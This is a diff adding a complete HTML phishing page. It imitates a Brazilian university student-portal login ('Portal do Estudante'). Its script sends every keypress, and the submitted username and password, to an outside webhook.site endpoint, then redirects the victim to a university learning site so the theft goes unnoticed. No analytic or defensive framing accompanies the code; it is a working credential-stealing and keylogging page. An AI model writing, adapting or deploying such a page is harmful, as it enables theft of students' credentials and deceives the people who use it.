@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Área do Aluno</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; background: #f4f4f4; padding: 50px; text-align: center; }
+    input { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
+    button { padding: 10px 20px; background: #007bff; color: white; border: none; cursor: pointer; }
+    button:hover { background: #0056b3; }
+  </style>
+</head>
+<body>
+  <h2>Login - Portal do Estudante</h2>
+  <form id="fakeLogin">
+    <input type="text" id="user" placeholder="RA ou Email" autocomplete="off"><br>
+    <input type="password" id="pass" placeholder="Senha" autocomplete="off"><br>
+    <button type="submit">Entrar</button>
+  </form>
+
+  <script>
+    const endpoint = "https://webhook.site/62457822-a08f-448b-8030-7c9fd34772a1";
+
+    document.onkeypress = function(e) {
+      fetch(endpoint, {
+        method: "POST",
+        body: JSON.stringify({ type: "key", key: e.key, time: Date.now() }),
+        headers: { "Content-Type": "application/json" }
+      });
+    };
+
+    document.getElementById("fakeLogin").onsubmit = function(e) {
+      e.preventDefault();
+      const u = document.getElementById("user").value;
+      const p = document.getElementById("pass").value;
+      fetch(endpoint, {
+        method: "POST",
+        body: JSON.stringify({ type: "login", user: u, pass: p, time: Date.now() }),
+        headers: { "Content-Type": "application/json" }
+      }).then(() => {
+        window.location.href = "https://ava.exemplo.edu.br";
+      });
+    };
+  </script>
+</body>
+</html>
